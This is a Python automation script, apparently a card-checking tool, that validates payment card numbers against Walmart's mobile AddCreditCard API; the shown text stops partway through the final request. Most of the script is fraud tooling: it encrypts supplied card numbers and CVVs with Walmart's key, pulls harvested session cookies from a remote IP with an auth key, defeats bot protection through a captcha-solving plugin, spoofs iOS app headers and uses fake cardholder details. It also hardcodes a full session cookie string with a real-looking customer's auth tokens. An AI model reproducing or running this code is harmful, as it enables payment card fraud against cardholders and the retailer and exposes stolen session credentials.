from flowlite import Flow, step, expect, http, js, finalize
from flowlite.plugins.captcha_wrapper import CaptchaWrapper
from flowlite.plugins.cookie_manager import CookieManager
from flowlite.plugins.parse_between_strings import _parse_between
from flowlite.plugins.sqlite import get_sqlite_plugin
import json
import re

# Tạo instance Flow
flow = Flow("walmart_mobile")
flow.use(CookieManager)

@step("init_input")
def init_input(ctx):
    """Khởi tạo dữ liệu đầu vào"""
    ctx.CCNUM = ctx.data.get("CCNUM")
    ctx.MM = ctx.data.get("MM")
    ctx.YYYY = ctx.data.get("YYYY")
    ctx.CCV = ctx.data.get("CCV")

@step("detect_card_type")
def detect_card_type(ctx):
    """Phân loại loại thẻ: VISA, MASTER, AMEX (mặc định UNKNOWN)"""
    card_number = (ctx.CCNUM or "").replace(" ", "").replace("-", "")
    card_type = "UNKNOWN"
    try:
        if not card_number.isdigit():
            ctx.card_type = card_type
            return
        length = len(card_number)
        # AMEX: Bắt đầu 34 hoặc 37, độ dài 15
        if length == 15 and (card_number.startswith("34") or card_number.startswith("37")):
            card_type = "AMEX"
        # VISA: Bắt đầu 4, độ dài 13,16,19
        elif card_number.startswith("4") and length in (13, 16, 19):
            card_type = "VISA"
        # MASTER: Bắt đầu 51-55 (16 số) hoặc 2221-2720 (16 số)
        elif length == 16:
            first_two = int(card_number[:2])
            first_four = int(card_number[:4])
            first_six = int(card_number[:6]) if length >= 6 else 0
            if 51 <= first_two <= 55:
                card_type = "MASTERCARD"
            elif 2221 <= first_four <= 2720:
                card_type = "MASTERCARD"
        ctx.card_type = card_type
    except Exception:
        ctx.card_type = "VISA"

@step("get_pie_key")
def get_pie_key(ctx):
    """Lấy PIE key từ Walmart"""
    url = "https://securedataweb.walmart.com/pie/v1/wmcom_us_vtg_pie/getkey.js"
    
    r = (http.get(url)
           .header("Accept", "*/*")
           .header("Accept-Encoding", "gzip, deflate, br")
           .header("Accept-Language", "en-US,en;q=0.9")
           .header("Cache-Control", "no-cache")
           .header("Pragma", "no-cache")
           .header("Referer", "https://www.walmart.com/")
           .header("Sec-Ch-Ua", '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"')
           .header("Sec-Ch-Ua-Mobile", "?0")
           .header("Sec-Ch-Ua-Platform", '"Windows"')
           .header("Sec-Fetch-Dest", "script")
           .header("Sec-Fetch-Mode", "no-cors")
           .header("Sec-Fetch-Site", "cross-site")
           .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
           .label("walmart-pie-key")
           .timeout(30.0)
           .send())
    
    expect.eq(r.status, 200, f"Failed to get PIE key, status: {r.status}")
    
    # Parse PIE key từ response
    response_text = r.text()
    #print(f"DEBUG - PIE response length: {len(response_text)}")
    #print(f"DEBUG - PIE response first 500 chars: {response_text[:500]}")
    
    ctx.PIEKEY = _parse_between(response_text, 'PIE.K = "', '"')
    ctx.key_id = _parse_between(response_text, 'PIE.key_id = "', '"')
    
    #print(f"DEBUG - PIEKEY found: {ctx.PIEKEY}")
    #print(f"DEBUG - key_id found: {ctx.key_id}")
    
    if not ctx.PIEKEY or not ctx.key_id:
        # Thử các pattern khác
        #print("DEBUG - Trying alternative patterns...")
        ctx.PIEKEY = _parse_between(response_text, "PIE.K = '", "'")
        ctx.key_id = _parse_between(response_text, "PIE.key_id = '", "'")
        
        if not ctx.PIEKEY or not ctx.key_id:
            # Thử regex
            import re
            pie_k_match = re.search(r'PIE\.K\s*=\s*["\']([^"\']+)["\']', response_text)
            pie_key_id_match = re.search(r'PIE\.key_id\s*=\s*["\']([^"\']+)["\']', response_text)
            
            if pie_k_match:
                ctx.PIEKEY = pie_k_match.group(1)
            if pie_key_id_match:
                ctx.key_id = pie_key_id_match.group(1)
        
        if not ctx.PIEKEY or not ctx.key_id:
            raise Exception(f"PIE key or key_id not found in response. Response: {response_text[:1000]}")

@step("run_pan_protector")
def run_pan_protector(ctx):
    """Chạy pan-protector để mã hóa thông tin thẻ"""
    #print(f"DEBUG - PIEKEY: {ctx.PIEKEY}")
    #print(f"DEBUG - key_id: {ctx.key_id}")
    #print(f"DEBUG - CCNUM: {ctx.CCNUM}")
    #print(f"DEBUG - CCV: {ctx.CCV}")
    
    script_args = {
        "PIEKEY": ctx.PIEKEY,
        "key_id": ctx.key_id,
        "CCNUM": ctx.CCNUM,
        "CCV": ctx.CCV
    }
    
    print(f"DEBUG - Script args: {script_args}")
    
    try:
        result = js.run("flows/js/pie/pan-protector.full.js", script_args, expect="json", timeout=30.0)
        #print(f"DEBUG - PAN protector result: {result}")
        
        ctx.protected_s = result.get("s")
        ctx.protected_q = result.get("q")
        ctx.protected_mac = result.get("mac")
        ctx.legacy_mode = result.get("legacy")
        
        #print(f"DEBUG - protected_s: {ctx.protected_s}")
        #print(f"DEBUG - protected_q: {ctx.protected_q}")
        #print(f"DEBUG - protected_mac: {ctx.protected_mac}")
        #print(f"DEBUG - legacy_mode: {ctx.legacy_mode}")
        
        if not ctx.protected_s or not ctx.protected_q or not ctx.protected_mac:
            raise Exception(f"PAN protector failed: {result}")
            
    except Exception as e:
        #print(f"DEBUG - PAN protector error: {e}")
        raise Exception(f"PAN protector failed: {e}")

@step("get_wm_cookies")
def get_wm_cookies(ctx):
    """Lấy cookies từ endpoint"""
    url = "http://172.236.141.206:33668/getline/wm-cookies-1.txt"
    
    r = (http.get(url)
           .header("Accept", "*/*")
           .header("Accept-Encoding", "gzip, deflate, br")
           .header("Accept-Language", "en-US,en;q=0.9")
           .header("Cache-Control", "no-cache")
           .header("Pragma", "no-cache")
           .header("Referer", "https://www.walmart.com/")
           .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36")
           .header("auth-key", "W6FBn0dIhAPsT8jsi2UnLXzMgtBb0YePNUk37T3pE4T07Tsuf7")
           .label("walmart-cookies")
           .via_requests()
           .timeout(30.0)
           .send())
    
    expect.eq(r.status, 200, f"Failed to get cookies, status: {r.status}")
    
    body = r.text()
    ctx.cookie_all = _parse_between(body, '"message":"{{{', '}}}"')
    if not ctx.cookie_all:
        raise Exception("cookie_all not found in response")

@step("call_captcha_plugin")
def call_captcha_plugin(ctx):
    """Sử dụng Captcha plugin để xử lý captcha và lưu vào database"""
    
    # Lấy proxy từ session
    session_proxy = ctx.session.get("proxy", "")
    ctx.session_proxy = session_proxy  # Lưu vào context
    
    # Chuẩn bị tham số cho Captcha plugin
    captcha_params = {
        "auth": "S[0EG;<67GH05EE607:I30E:F80I3F7:ED5E<I5",
        "site": "walmart",
        "proxyregion": "us",
        "region": "mobile",
        "proxy": session_proxy
    }
    
    # Tạo instance CaptchaWrapper trực tiếp
    captcha_wrapper = CaptchaWrapper()
    
    # Gọi Captcha plugin - nó sẽ tự động kiểm tra database và xử lý
    #print(f"DEBUG - Calling captcha plugin with params: {captcha_params}")
    
    #print(f"DEBUG - Flow ID: {getattr(ctx, 'uuid', None)}")
    
    result = captcha_wrapper.generate_and_hold_captcha(
        flow_id=getattr(ctx, 'uuid', None),
        **captcha_params
    )
    
    #print(f"DEBUG - Captcha plugin result: {result}")
    
    # Cập nhật thông tin từ captcha plugin
    if result.get("success"):
        # Cập nhật các giá trị từ kết quả plugin
        ctx.Ua = result.get("UserAgent", "")
        ctx.sechua = result.get("secHeader", "")
        # pxhd chỉ có khi gọi /gen, không cập nhật từ holdcaptcha
        if result.get("pxhd"):
            ctx.pxhd = result.get("pxhd", "")
        ctx.paradata = result.get("data", "")
        
        # Lưu response đầy đủ
        ctx.holdcaptcha_response = {
            "error": False,
            "cookie": result.get("cookie", ""),
            "vid": result.get("vid", ""),
            "cts": result.get("cts", ""),
            "secHeader": result.get("secHeader", ""),
            "isMaybeFlagged": result.get("isMaybeFlagged", False),
            "UserAgent": result.get("UserAgent", ""),
            "flaggedPOW": result.get("flaggedPOW", False),
            "data": result.get("data", "")
        }
        
    else:
        # Xử lý lỗi
        error_msg = result.get("error", "Unknown captcha error")
        raise Exception(f"Captcha plugin failed: {error_msg}")

@step("cc")
def process_cookies_for_tls(ctx):
    """Xử lý cookies để sử dụng với via_tls requests"""
    try:
        # Cookie đã được chuyển về định dạng "message":"{{{a=b;c=d;e=f;...}}}"
        # Chỉ cần lấy phần cookie string và loại bỏ các cookie không cần thiết
        cookie_string = ctx.cookie_all
        
        if not cookie_string:
            raise Exception("No cookies found in response")
        
        # Tách cookies thành từng cặp name=value
        cookie_pairs = []
        excluded_cookies = {'_pxhd', '_px3'}
        
        # Tách cookies theo dấu ';' và xử lý từng cookie
        for cookie in cookie_string.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                name = name.strip()
                value = value.strip()
                
                # Chỉ thêm cookie nếu không nằm trong danh sách loại trừ
                if name not in excluded_cookies:
                    cookie_pairs.append(f"{name}={value}")
        
        # Lưu cookie string cho via_tls
        ctx.cookie_all_via_tls = "; ".join(cookie_pairs)
        
        #print(f"DEBUG - Processed {len(cookie_pairs)} cookies for via_tls")
        #print(f"DEBUG - Cookie string length: {len(ctx.cookie_all_via_tls)}")
        
    except Exception as e:
        raise Exception(f"Failed to process cookies: {e}")

@step("get_database_cookies")
def get_database_cookies(ctx):
    """Lấy cookies từ database"""
    try:
        # Lấy CaptchaWrapper để truy cập pxhold data
        captcha_wrapper = CaptchaWrapper()
        
        # Lấy flow_id hiện tại
        flow_id = getattr(ctx, 'uuid', None)
        
        # Thử lấy data từ flow_id hiện tại trước
        if flow_id:
            pxhold_data = captcha_wrapper.get_successful_pxhold(flow_id)
            if pxhold_data:
                ctx.cookie_px3 = pxhold_data.get("cookie", "")
                ctx.cookie_pxhd = pxhold_data.get("pxhd", "")
                ctx.px_ua = pxhold_data.get("ua", "")
                ctx.px_sechua = pxhold_data.get("sechua", "")
                ctx.cookie_pxvid = pxhold_data.get("vid", "")
                ctx.cookie_pxcts = pxhold_data.get("cts", "")
                #print(f"DEBUG - Retrieved pxhold data for flow_id: {flow_id}")
                return
        
        # Nếu không tìm thấy, lấy data mới nhất
        pxhold_data = captcha_wrapper.get_successful_pxhold(None)
        if pxhold_data:
            ctx.cookie_px3 = pxhold_data.get("cookie", "")
            ctx.cookie_pxhd = pxhold_data.get("pxhd", "")
            ctx.px_ua = pxhold_data.get("ua", "")
            ctx.px_sechua = pxhold_data.get("sechua", "")
            ctx.cookie_pxvid = pxhold_data.get("vid", "")
            ctx.cookie_pxcts = pxhold_data.get("cts", "")
            
            #print(f"DEBUG - Retrieved most recent pxhold data")
        else:
            print("DEBUG - No pxhold data found in database")
            
    except Exception as e:
        raise Exception(f"Failed to get database cookies: {e}")

@step("add_px_cookies_to_via_tls")
def add_px_cookies_to_via_tls(ctx):
    """Thêm PX cookies vào cookie_all_via_tls"""
    try:
        #custom_cookie = "vtc=eWgU1z3VXeKvKhMmcuXyUY; bstc=eWgU1z3VXeKvKhMmcuXyUY; pxcts=26f0bc3f-9b84-11f0-b2a7-1be2b8934ebe; _pxvid=24465d27-9b84-11f0-bf3e-1c6a2e1431c5; io_id=956da0b7-bc26-4d96-9240-84abc20c82e8; _intlbu=false; _m=9; _shcc=US; assortmentStoreId=948; hasLocData=1; userAppVersion=usweb-1.224.0-fb801e0fe2dd28531a9b6c1d77cb85044cf70d55-9251249r; abqme=true; xpth=x-o-mart%2BB2C~x-o-mverified%2Bfalse; WLM=1; walmart-identity-web-code-verifier=68fpTloW-Gbx0X3kgabDz2lny28warHl-0VbpgBW5Mw; TS012af430=01d4c7e124891d239643e3c2de9db313d4b638b66eb80a0bb4417ac4e378b75e52664e88a570434af3371cdbc63cc4bac47835bc21; CID=b7f2304e-efdd-425a-8104-1beaaa7af4f0; SPID=MDYyMTYyMDI17f8Fo4TomOGdKPEtB-SiCTP8iU9YXUj5uQfFs1W33hB120ESpE1zrRJVAJAP3Xc_bgBl3IUiDjmRiZ6i6_mQCG4JpaLPjEcdO-NOLw; customer=%7B%22firstName%22%3A%22Rachel%22%2C%22lastNameInitial%22%3A%22M%22%2C%22ceid%22%3A%22c3fe8adbfc9a1e0b9c90c3b55fd3dcb98d06106dc4628e56edee70c88861759c%22%7D; hasCID=1; type=REGISTERED; wm_accept_language=en-US; _tpl=40; _tplc=AUMqZD3sGb8jj7QeNEIuUTaIw9dCz0G+Ly7qZww7+CM=; wmlh=1b31a03f8aabb6d04441db2eda1f9df3189f4339e596e0f84c35a5d9d268ca4d; adblocked=false; __cf_bm=NO.I7SENpvVgt_36U5nCfg3Lsd_6TmuGlUpwPvvK2Jc-1758965412-1.0.1.1-AwenUWps04XT2Tec4hAiGvzFlk7DRwldcnZlQPVyqRlxbAdX4_I7yXoK6oVl.oYePHJiHM3c3CQ3uB1CIj_UHZm8p_KvRRp5j1uvtg_tqp86nZkKErGt4hO0lu6xMcWM; sptimestamp=1758965428592; _s=:1759152169372; _sc=Q1sKGN6Z0KfT%2F6o2oV9rpHKwNsljRXWlCIBBmuvQDm4%3D; _tsc=MTQyODYyMDIy5WLTgsX2ttfGGaMP%2BTferLmMR4JOFbyT5rDCsNXzNB4L11S5cIlrdtQyt7d%2BuLELyGeuBqhKi9NnJsGAaQUugbjlJj%2Bti3i9V1Ud%2BjQNT7G5dmUEIk2O%2BAya3bVboDNcQG2FY1B9SxAFXx%2BbGBRricV0h8UMxaDVbzAaPATZWIlT5DaXwru%2Bst%2FMTZodq6CVFvB9xSFc28%2Bj9ezMsUy4F6pp8oOPxib7pctUQDaA0HJ7t71etya0DmyjcmJ2E9geqgdH8L2iM6pMnI171MyZMwKy9KBZNb1kacAHQCliPcYhgPl1v8M8XQqTp3HyF6cOpZc974kOiNHqSkF3Sv3oIIDEh6vEJ2HofFQLwW0%2BBnT1rD2SMt3Ov5W%2BSM9MfE6X5Fep27xRwwnPCLoXUynINxqCH5G0CriJVcBHPtZRT5e8WsXxWJ%2FflccZWSxnpaUKlQ0mLKhXHEtiKg%3D%3D; auth=MTAyOTYyMDE4kpl2It0R12TRW%2FAVgyT%2FcxBIwfknSlDuqNL8RJg5XQP52Pnheks7j3DQ4SwyWZAW%2FEhWDOx5wlvyZqLwxSmJeynSDCDbyZPilPG8tEgeCAMe0kk71JFQo0Jehzv5B%2Bb9tp4PYtnTPrH3YwCBYIU2juxsjl6pxPcE1tnuVpUQMaJS3HurS4yCow7P8VZ7dDn0JPZNX1Khm86gNV%2Ftg8s%2BPkOmufKwVHRCRqMPUsZ6WpKqGXTRjJD7g6PyDs3UqmGUpGd2w9VMvEOMsmi01MtA%2F21PwDanUvD7LOq7UmaE%2FMglrMJCR3k8g2Rmb3kB%2FWggzYPjNplBIhk%2BrWwHZuKt2AskGeAhPGD3prx%2BznxznKu4%2Bc1RliGOHrB0KWQvaxKll8B2v4DbNkpTG3fgeO1JalrkDtYeb1QQxKl%2BVItkpSbm5YrxAyUkRoS6J2Mgks2SV%2BE%2BQnOzrTctuv%2B2QI96r54b%2BWnOo5lxIu8fsr2sKYnpP2xsdnHquXFs8XSwKdda; xpa=-5-yD|-dl5I|-kyYS|2qLz9|3Xes_|3d8P6|3lffD|3wOFA|5EoFC|66yjf|74tY7|7L59a|8UWH4|8c4U9|9ohPP|BYzSI|EGJef|EeXYg|FEppv|Gk6n1|GmRmr|GwPRs|INLra|IVtQF|JKaCC|KwLVj|LkfJa|M62Wj|Mx7J7|P3aPs|PKA1g|QPToB|T5Z4k|TCS94|TO_e8|Tq8sA|Ttdlj|UXYCa|Uhyp2|V1X6B|Vtlq3|YUOiS|ZzTXg|_7RrM|_MmQi|bcdkp|c9SXY|em0yb|en-xs|f4tI4|fdm-7|flqYL|h6nfw|j2D95|jM1ax|jPq86|kD20O|lDoEE|lFQDz|lRqNQ|lUF9_|m-wgr|oDoRv|otvKJ|pVetj|px6_O|q0z_B|qFE4q|rH8ha|s21TG|sYZ7o|sdv8N|t_PFU|u7rEL|uhwUS|vG33N|yPdDQ|zR-nl; exp-ck=2qLz913Xes_c3d8P613lffD13wOFA15EoFC166yjf17L59a18UWH419ohPP1BYzSI1EGJef1FEppv1Gk6n11GwPRs1INLra1LkfJa1Mx7J72P3aPs1PKA1g1QPToB1T5Z4k3TCS941TO_e81Tq8sA1UXYCa1Uhyp21Vtlq32YUOiS1ZzTXg1_7RrM4_MmQi1bcdkp1c9SXY1em0ybbf4tI41fdm-71flqYL5h6nfw3j2D954jPq865kD20O6lFQDz1ozs5w1pC-ah1s21TG1sYZ7obu7rEL1uhwUS2vc4sx1x-cAg1yPdDQ1; _pxhd=e56e626834ca5da81b76ae0caebb821e6ec9bbad65d08031aea363e4c818a53c:24465d27-9b84-11f0-bf3e-1c6a2e1431c5; isoLoc=US_MD_t3; xptc=_m%2B9~_s%2B:1759152169372~assortmentStoreId%2B948; _astc=88c60a11fd7b780eee7f571cc48dee30; xpm=1%2B1759152173%2BeWgU1z3VXeKvKhMmcuXyUY~b7f2304e-efdd-425a-8104-1beaaa7af4f0%2B0; _vc=%2B%2BjTXwoPFKuO5KvnnUmUfE1shUFCjG6F3E2Prad6fkI%3D; akavpau_p2=1759152782~id=c03eb4588fa60e849be29abfec017f1d; AID=wmlspartner=0:reflectorid=0000000000000000000000:lastupd=1759152187445; bm_mi=BBEF497745EBA7449A8E6086040344B2~YAAQjInMF6mTBXWZAQAAgwWplR3M07pZ5Y2sjrDOqrAV6Kjz+FNL36QKRoryOPDxf21dVT2M4sgDzAz9SPfcWLTL/bS7lbrubCLQEqoGA5gLH8poBweKQraJBccicuQnuS8ohbNerI9eMVkk1Wd8Ym2Omr23eB91+AgkHww9mOmhWZjNQi/6cCuF7EVQqg7IfB0ezjMRcQi29Cv8+q54HC5tjiKUnsfZU76UnRw0GLY142TA/MZaYjTaComGyMbJRRRUBIYiCE5lceqptAZme59B0Nxzs4CNm3DUc8Mo2E9gBgVyOOWWRwYHqufw7Kp0POrUlA==~1; bm_sv=076AF169858893F53585C54C7704677F~YAAQjInMF9yuBXWZAQAARyOplR2vPaMzEv8fwOh8anwBUGkoHhDGsFTzyKBpBU85wLNXXeLDNEppraERqUIL9mew7JgvcDus3W/TbZp1mzuaaFFsD9kw7QtvI3esvQQ5Y446Vy4oCgX/RNfWyTq/LLx9CfBwrqAUjTPKpNWe/VrOrzmCcZpkDERrYwIovxoKmeF7OT5TfG40UulkyxUGQbrOusiitqkWBC6HL7ojnaXBi3+b5ldx7n6FrbH/RUD6B4I=~1; ak_bmsc=9CAADBB4FBE25E4B0C34C3EBF50A797F~000000000000000000000000000000~YAAQjInMFwpRBnWZAQAA8OSplR0YChMG7HydAX+hr6ZKzm2ysvvYepmZxs3w5KUsKKPhXiPijmWk5F3XzLakjlxdJddSForNQo0ztAvGnKh+HTSYzxeNWUry4sXOGtjk7PB2Gy6dnOoHc9cM6JE7Mwi3cY2RqZwxT0TbPEEDJh7A7LOU9OeGnHuETnQA2L+dvtJXKqXHEdt0JbyujzNnahQtsLSxBOBhZfA0B3Oath1EdnGuH1QYi9fmOw8lnwFKYF/nIz2ldILb4tjrkxgQqW/GtwKv2qDjL0ipyPb0dvb0pzX1A0gHhT/E54pLRMagXAEbaqUulK0wPox05hLoo36BgqNLNPnjg5plks5Gs67dqmT1QD6rDwX5/rnDRPtBdbrzpcRrSssv+03q/leyykshIRBEFwQD0A6diyD3Z9t5UO/+gw==; akavpau_p4=1759153316~id=6da529e25e52bd090c7741967137e584; _lat=MDYyMTYyMDI1ttgmODrreAwKOP4tAPOJlsxwNKHUy67nGaA0icXqfsLD-Akj0CFKhdg; _msit=MDYyMTYyMDI1QL1pRDRj5SvIi_nn3BgCE2IXDF65-_r37gPGPcJQpG9151PS0Q; _px3=f66ddb2cb47e78d34a488962515c6fe26f0416306273d0e97c1538be5ab731af:G0DSvwhve+xxAD4TFX+NvbbRb+CcBtBEd+nPnzhkqP8Fcx4lF61P/5UtbwUiYr3doDR0CBzu8vc6Dfstl+8bbg==:1000:rpi7X4I7iOFrIiA9Jiu6nr9iRvGr+RKca2lZJJLNiuGn3erKz3CiZhUq9MZ3AvHeL0topHd6koRF+RRo/phft8zcsZN3FWCGhSrF/U6aP1rmbTRqJG1DKfvNhGtQfau5ptlrJGM6qTn7ZA81RtOLxEEmO/s8kAkRBCGV57wARrsKCBEpFSefbAnrQE+Dgv2gZpbLs2iEmqLlQx6M2Oy9taqzyqVgC1CXIeNjUQ7oQ20=; if_id=FMEZARSFBvrVGltnTFcV9+MWiIw3X7ogeHj4UFOPmAinfmK6bzdj9ckNMzh8BWv3B6zulZO0EfIh7x+dXFqAGB2PEeoCp5uATtNOhqh9PbkzsM+0ZbeGxCDvFyNflcvvyFoBNu6N0jxXlUPHVllsH3YgUY/KB0gxRyvrtSyns6qXdKzyEY9ZE5ZBjAKqgPnkiVKC7oI5oE2yabM6XcQ5TkBDr6t9SMmaugxWPMbfV1KTJxHB+cXuSVSZaf19ddbygH+kj6r3sY+Ym09nqKOmFj0Xd8hUBRWRZ6i7fGqWu7Oz6Z+R2hVPejO3f10ezOXqbTWs1utoX06664iwaA==; TS016ef4c8=01c66dd6ce05be809c3cdcae98706837bb714c29669781d5bef47846a36eb6ce0f856995ed71f12b9ff03903464fe1f1e00438bdf5; TS01f89308=01c66dd6ce05be809c3cdcae98706837bb714c29669781d5bef47846a36eb6ce0f856995ed71f12b9ff03903464fe1f1e00438bdf5; TS8cb5a80e027=089d05c322ab2000b2af2494e9db55f97c3ab428ad864c8fdfda6ca95bbe0587d688b836a03a1ee5087698de3d11300093d9ae525dce639e1f4a4fd467b07c834f1a41c6a4566686fa5a000e96b76381a293bc8ec7d3788341291fdaf8079260; _pxde=1bb18860b9e56a75e6c3028ddf3287ad588c8e46ac27f64ac120fe62f7eec709:eyJ0aW1lc3RhbXAiOjE3NTkxNTI3MzAwNzN9; com.wm.reflector=reflectorid:0000000000000000000000@lastupd:1759152735395@firstcreate:1758965386168; xptwg=2012196003:66D134071335F8:FB0728:5F235C61:85AAB2D4:6110B9BD:; xptwj=uz:e95277e6bbdd4b8226f8:AOkTjlVPylfw4th2PaAYyzKVgqQzntIrs3SOky8qocxsl3cak/1uD0IwFAzzmRGyFUSEHi5AWWaSF5F08TH3PTugPm070CmZ5py1BEVkS36iTUwYzXq5hbBQ010R46KGQAFE2G9REBHCnTD29Q2lwRSleeFSZuRbeFAXvw1M2XBi2kzk+qtyEcETpUIxeCW1fdoKvznCfMChYYA=; TS012768cf=01ea77998e46a67d5997bb771c356c35075e2addef4b8e20570bd6f43efab9754c4b2b6402f48c38c384fba91dfb7590ba1ef64309; TS01a90220=01ea77998e46a67d5997bb771c356c35075e2addef4b8e20570bd6f43efab9754c4b2b6402f48c38c384fba91dfb7590ba1ef64309; TS2a5e0c5c027=088aabe950ab20000bdc645d997976ea91bff6d8be276419d3816c55314a0520ec85f14fd0804d69087dfea2c4113000981959d7db59f0a8d20ce59b0ec6d0dfa8e0fe5040c75deaf0f24af3e5207141e966124a02fc7d85ceda3ed758f21f89"

        #Lấy cookie_all_via_tls hiện tại
        current_cookies = ctx.get("cookie_all_via_tls", "")
        #current_cookies = custom_cookie
        # Thêm PX cookies
        px_cookies = []
        
        if ctx.get("cookie_pxcts"):
            px_cookies.append(f"pxcts={ctx.cookie_pxcts}")
        
        if ctx.get("cookie_pxvid"):
            px_cookies.append(f"_pxvid={ctx.cookie_pxvid}")
        
        if ctx.get("cookie_pxhd"):
            px_cookies.append(f"_pxhd={ctx.cookie_pxhd}")
        
        if ctx.get("cookie_px3"):
            # Xử lý _px3 cookie - có thể có prefix "_px3="
            px3_value = ctx.cookie_px3
            if px3_value.startswith("_px3="):
                px_cookies.append(px3_value)
            else:
                px_cookies.append(f"_px3={px3_value}")
        
        # Kết hợp cookies
        all_cookies = []
        if current_cookies:
            all_cookies.append(current_cookies)
        if px_cookies:
            all_cookies.extend(px_cookies)
        
        ctx.cookie_all_via_tls = "; ".join(all_cookies)
        
    except Exception as e:
        raise Exception(f"Failed to add px cookies: {e}")

@step("load_cookie_all_into_jar")
def load_cookie_all_into_jar(ctx):
    """Nạp chuỗi cookie_all_via_tls vào kho ctx.session['cookies'] để CookieManager dùng tự động"""
    try:
        jar = (ctx.session.setdefault("cookies", {}))
        s = ctx.get("cookie_all_via_tls", "") or ""
        for part in s.split(";"):
            kv = part.strip()
            if not kv:
                continue
            if "=" in kv:
                k, v = kv.split("=", 1)
                jar[str(k).strip()] = str(v).strip()
    except Exception as e:
        raise Exception(f"Failed to load cookie_all_via_tls into jar: {e}")

@step("check_membership")
def check_membership(ctx):
    """Gọi API membership GET với header giống create_credit_card_mobile"""
    # Snapshot cookie trước khi gọi
    try:
        ctx.cookies_before_membership = dict((ctx.session.get("cookies") or {}))
    except Exception:
        ctx.cookies_before_membership = {}
    url = "https://www.walmart.com/orchestra/account/graphql/membership/5b88a9299bffe62bb2807ba3b613efd2613a74ef75140d4b07e775dc133c598a?id=5b88a9299bffe62bb2807ba3b613efd2613a74ef75140d4b07e775dc133c598a&variables=%7B%22discountedGroupInput%22:%7B%22name%22:%22%22,%22planId%22:null%7D,%22isConsentRequiredFlowEnabled%22:false,%22isFetchAddOns%22:false,%22isFetchDiscountedEligibility%22:false,%22isFetchProratedRefund%22:false,%22isFreeTrialEligibilityNeeded%22:false%7D"

    # Lấy _px3 từ context và bỏ prefix "_px3=" nếu có
    px3_value = ctx.get("cookie_px3", "")
    if px3_value.startswith("_px3="):
        px3_value = px3_value[5:]

    r = (http.get(url)
           .header("X-O-Platform-Version", "25.12.2")
           .header("X-Enable-Server-Timing", "1")
           .header("X-Px-Os", "iOS")
           .header("X-O-Fuzzy-Install-Date", "1758800000000")
           .header("Accept", "*/*")
           .header("Accept-Encoding", "gzip, deflate, br")
           .header("User-Agent", "WMT1H/25.12.2 iOS/15.8.4")
           .header("X-O-Mart", "B2C")
           .header("X-O-Segment", "oaoh")
           .header("X-Px-Mobile-Sdk-Version", "3.2.6")
           .header("X-O-Bu", "WALMART-US")
           .header("X-Latency-Trace", "1")
           .header("Accept-Language", "en-US")
           .header("X-Px-Authorization", f"3:{px3_value}")
           .header("Wm_mp", "true")
           .header("X-Apollo-Operation-Name", "membership")
           .header("X-O-Platform", "ios")
           .header("X-Px-Os-Version", "15.8.4")
           .header("Content-Type", "application/json; charset=UTF-8")
           .header("X-Px-Device-Model", "iPhone 6s Plus")
           .header("X-O-Device", "iPhone8,2")
           .header("X-Wm-Client-Name", "glass")
           .header("X-O-Tp-Phase", "tp5")
           .header("Baggage", "deviceType=ios,trafficType=release")
           .label("walmart-check-membership")
           .via_tls()
           .timeout(30.0)
           .send())

    ctx.membership_status = r.status
    ctx.membership_response = r.text()
    # Snapshot cookie sau khi gọi
    try:
        ctx.cookies_after_membership = dict((ctx.session.get("cookies") or {}))
    except Exception:
        ctx.cookies_after_membership = {}
    #print(f"DEBUG - Membership Status: {r.status}")
    #print(f"DEBUG - Membership Body: {r.text()}")
    #print(f"DEBUG - 1st Cookie: {ctx.cookies_before_membership}")
    #print(f"DEBUG - 2nd Cookie: {ctx.cookies_after_membership}")
    #raise AssertionError("chjec")

@step("create_credit_card_mobile")
def create_credit_card_mobile(ctx):
    """Gọi API GraphQL mobile để tạo credit card"""
    
    url = "https://www.walmart.com/orchestra/account/graphql/AddCreditCard/3d3e0b30e5f4229e2470bf33dc3f10a89895974880d1047f5188794446a99c5c"
    
    # Lấy _px3 từ context và bỏ prefix "_px3="
    px3_value = ctx.get("cookie_px3", "")
    if px3_value.startswith("_px3="):
        px3_value = px3_value[5:]
    
    # Chuẩn bị body với dữ liệu thực tế
    body_data = {
        "extensions": {
            "persistedQuery": {
                "sha256Hash": "3d3e0b30e5f4229e2470bf33dc3f10a89895974880d1047f5188794446a99c5c",
                "version": 1
            }
        },
        "id": "3d3e0b30e5f4229e2470bf33dc3f10a89895974880d1047f5188794446a99c5c",
        "operationName": "AddCreditCard",
        "variables": {
            "input": {
                "address": {
                    "addressId": None,
                    "addressLineOne": "7683 Longbeach",
                    "addressLineThree": "",
                    "addressLineTwo": "",
                    "city": "Longbeach",
                    "colony": "",
                    "country": "US",
                    "countryCallingCode": None,
                    "municipality": "",
                    "postalCode": "90003",
                    "state": "CA"
                },
                "cardType": ctx.get("card_type", "VISA"),
                "countryCallingCode": None,
                "encryptedCVV": ctx.get("protected_q", ""),
                "encryptedPan": ctx.get("protected_s", ""),
                "expiryMonth": int(ctx.MM),
                "expiryYear": int(ctx.YYYY),
                "firstName": "hammer",
                "integrityCheck": ctx.get("protected_mac", ""),
                "invokeProfileConsent": None,
                "isDefault": True,
                "keyId": ctx.get("key_id", ""),
                "lastName": "john",
                "nameOnCard": "john hammer",
                "phase": "0",
                "phone": "7145852246",
                "walletId": None
            }
        }
    }
    
    r = (http.post(url)
           .header("X-O-Platform-Version", "25.12.2")
           .header("X-Enable-Server-Timing", "1")
           .header("X-Px-Os", "iOS")
           .header("X-O-Fuzzy-Install-Date", "1758800000000")
           .header("Accept", "*/*")
           .header("Accept-Encoding", "gzip, deflate, br")
           .header("User-Agent", "WMT1H/25.12.2 iOS/15.8.4")
           .header("X-O-Mart", "B2C")
           .header("X-O-Segment", "oaoh")
           .header("X-Px-Mobile-Sdk-Version", "3.2.6")
           .header("X-O-Bu", "WALMART-US")
           .header("X-Latency-Trace", "1")
           .header("Accept-Language", "en-US")
           .header("X-Px-Authorization", f"3:{px3_value}")
          #.header("cookie", custom_cookie)
           .header("Wm_mp", "true")
           .header("X-Apollo-Operation-Name", "AddCreditCard")
           .header("X-O-Platform", "ios")
           .header("X-Px-Os-Version", "15.8.4")
           .header("Content-Type", "application/json; charset=UTF-8")
           .header("X-Px-Device-Model", "iPhone 6s Plus")
